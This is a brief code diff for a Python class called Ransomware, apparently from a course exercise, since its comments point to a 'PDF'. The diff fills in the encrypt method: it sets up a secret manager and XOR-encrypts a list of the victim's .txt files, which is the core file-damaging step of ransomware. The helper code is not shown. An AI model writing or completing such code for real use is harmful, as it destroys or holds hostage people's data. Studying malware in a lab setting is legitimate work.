@@ -46,6 +46,9 @@ class Ransomware:
         # main function for encrypting (see PDF)
         list = self.get_files("*.txt")
         call = SecretManager()
+        call.setup()
+        call.xorfiles(list)
+        
 
     def decrypt(self):
         # main function for decrypting (see PDF)
